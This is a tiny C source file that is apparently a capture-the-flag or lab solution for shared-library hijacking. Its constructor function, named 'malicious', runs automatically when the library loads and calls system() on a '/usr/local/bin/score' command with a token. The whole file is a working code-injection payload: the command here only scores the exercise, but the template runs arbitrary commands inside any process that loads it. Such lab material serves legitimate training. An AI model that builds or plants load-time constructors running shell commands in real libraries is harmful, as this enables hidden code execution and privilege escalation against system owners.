#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score d7b82369-c6a1-4566-a18f-41f8f58306b4");
}
